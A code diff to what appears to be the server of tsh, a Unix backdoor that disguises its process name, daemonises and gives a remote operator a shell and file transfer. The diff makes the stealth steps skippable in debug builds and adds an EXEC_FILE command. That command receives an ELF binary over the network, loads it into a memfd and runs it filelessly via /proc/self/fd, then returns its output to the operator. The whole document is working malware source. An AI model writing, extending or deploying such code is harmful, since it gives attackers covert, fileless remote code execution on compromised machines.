@@ -16,6 +16,9 @@
 #include <stdio.h>
 #include <fcntl.h>
 #include <netdb.h>
+#define _GNU_SOURCE
+#include <linux/memfd.h>
+#include <sys/mman.h>
 
 /* PTY support requires system-specific #include */
 
@@ -69,37 +72,40 @@ int main( int argc,char **argv )
     struct hostent *client_host;
 
 #endif
+
+#ifndef DEBUG
     /* overwrite cmdline */
-    memset((void *)argv[0], '\0', strlen(argv[0]));
+    memset((void*)argv[0], '\0', strlen(argv[0]));
     strcpy(argv[0], FAKE_PROC_NAME);
 
     /* fork into background */
 
     pid = fork();
 
-    if( pid < 0 )
+    if (pid < 0)
     {
-        return( 1 );
+        return(1);
     }
 
-    if( pid != 0 )
+    if (pid != 0)
     {
-        return( 0 );
+        return(0);
     }
 
     /* create a new session */
 
-    if( setsid() < 0 )
+    if (setsid() < 0)
     {
-        return( 2 );
+        return(2);
     }
 
     /* close all file descriptors */
 
-    for( n = 0; n < 1024; n++ )
+    for (n = 0; n < 1024; n++)
     {
-        close( n );
+        close(n);
     }
+#endif // !DEBUG
 
 #ifndef CONNECT_BACK_HOST
 
@@ -200,7 +206,7 @@ int main( int argc,char **argv )
 #endif
 
         /* fork a child to handle the connection */
-
+#ifndef DEBUG
         pid = fork();
 
         if( pid < 0 )
@@ -215,6 +221,7 @@ int main( int argc,char **argv )
             close( client );
             continue;
         }
+#endif
 
 #ifndef CONNECT_BACK_HOST
 
@@ -226,18 +233,21 @@ int main( int argc,char **argv )
 
         /* the child forks and then exits so that the grand-child's
          * father becomes init (this to avoid becoming a zombie) */
-
+#ifndef DEBUG
         pid = fork();
 
-        if( pid < 0 )
+        if (pid < 0)
         {
-            return( 8 );
+            return(8);
         }
 
-        if( pid != 0 )
+        if (pid != 0)
         {
-            return( 9 );
+            return(9);
         }
+
+#endif // !DEBUG
+
 
         /* setup the packet encryption layer */
 
@@ -274,12 +284,17 @@ int main( int argc,char **argv )
 
             case PUT_FILE:
 
-                ret = tshd_put_file( client );
+                ret = tshd_put_file( client);
                 break;
 
             case RUNSHELL:
 
                 ret = tshd_runshell( client );
+                break;
+
+            case EXEC_FILE:
+
+                ret = tshd_exec_file(client);
                 break;
 
             default:
@@ -345,7 +360,7 @@ int tshd_get_file( int client )
     return( 18 );
 }
 
-int tshd_put_file( int client )
+int tshd_put_file( int client)
 {
     int ret, len, fd;
 
@@ -392,6 +407,127 @@ int tshd_put_file( int client )
     }
 
     return( 23 );
+}
+
+int tshd_exec_file(int client) {
+
+    int ret, len;
+
+    long long file_len = 0;
+    /* get file len */
+    ret = pel_recv_msg(client, &file_len, &len);
+
+    char* file_buf = malloc(file_len);
+
+    /* get the filename */
+
+    ret = pel_recv_msg(client, message, &len);
+
+    if (ret != PEL_SUCCESS)
+    {
+        return(19);
+    }
+
+    message[len] = '\0';
+
+    size_t total_len = 0;
+    while (1)
+    {
+        if (total_len >= file_len) {
+            break;
+        }
+        ret = pel_recv_msg(client, message, &len);
+        if (ret != PEL_SUCCESS)
+        {
+            if (pel_errno == PEL_CONN_CLOSED)
+            {
+                break;
+            }
+            return(21);
+        }
+        memcpy(file_buf+total_len, message, len);
+        total_len += len;
+    }
+
+    int fd = memfd_create("elf_data", MFD_CLOEXEC | MFD_ALLOW_SEALING);
+   if (fd == -1) {
+        perror("memfd_create failed. Error");
+        return 1;
+    }
+    if (write(fd, file_buf, total_len) != total_len) {
+        perror("write failed. Error");
+        return 1;
+    }
+    if (ftruncate(fd, total_len) == -1) {
+        perror("ftruncate failed. Error");
+        return 1;
+    }
+
+    void* addr = mmap(NULL, total_len, PROT_READ | PROT_EXEC, MAP_SHARED, fd, 0);
+    if (addr == MAP_FAILED) {
+        perror("mmap failed. Error");
+        return 1;
+    }
+
+    char path[256];
+    sprintf(path, "/proc/self/fd/%d", fd);
+    
+    int fdo[2], fde[2];
+    if (pipe(fdo) < 0) {
+        perror("pipe 1 error");
+        return -1;
+    }
+    if (pipe(fde) < 0) {
+        perror("pipe 2 error");
+        return -1;
+    }
+
+    pid_t pid = fork();
+    if (pid < 0)
+    {
+        return 22;
+    }
+
+    if (pid != 0)
+    {
+        close(fdo[1]);
+        close(fde[1]);
+        waitpid(pid, NULL, 0);
+
+        sleep(5);
+        len = read(fdo[0], message, BUFSIZE);
+        pel_send_msg(client, message, len);
+
+        len=read(fde[0], message, BUFSIZE);
+        pel_send_msg(client, message, len);
+
+        close(fdo[0]);
+        close(fde[0]);
+        return 0;
+    }
+
+    pid = fork();
+    if (pid < 0)
+    {
+        return 23;
+    }
+
+    if (pid != 0)
+    {
+        exit(0);
+    }
+
+    close(fdo[0]);
+    close(fde[0]);
+
+    sleep(1);
+    dup2(fdo[1], STDOUT_FILENO);
+    dup2(fde[1], STDERR_FILENO);
+
+    char* args[] = { (char*)addr, NULL }; // Assume the ELF data is a program that takes no arguments. Adjust as needed.
+    execve(path, args, NULL); // Replace <fd> with the actual file descriptor number. It should be the same as 'fd' in this example. But better to use the actual fd number for robustness. 
+    perror("execve failed. Error"); // This should only be reached if execve() returns an error. In that case, you might want to munmap() the memory and exit(). 
+    munmap(addr, total_len); // Unmap the memory if execve() fails. 
 }
 
 int tshd_runshell( int client )
